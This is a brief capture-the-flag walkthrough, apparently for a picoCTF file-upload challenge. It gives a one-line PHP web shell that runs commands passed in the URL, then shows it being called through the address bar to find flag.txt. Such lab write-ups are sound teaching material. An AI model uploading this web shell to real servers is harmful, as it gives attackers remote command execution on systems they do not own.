## How to resolve?

You will find that uploaded file is stored in `/upload` and you can access from address bar.
And this problem site is running on php platform.
So it means that you may run php script.

For example, upload this script.

````php
<?php system($_GET["cmd"]);?>
````

After uloaded, you can kick script via address bar.
Like

````txt
http://standard-pizzas.picoctf.net:55961/upload/hack.php?cmd=sudo%20-l%20/root
````
You will see

````txt
flag.txt
````

In other words?
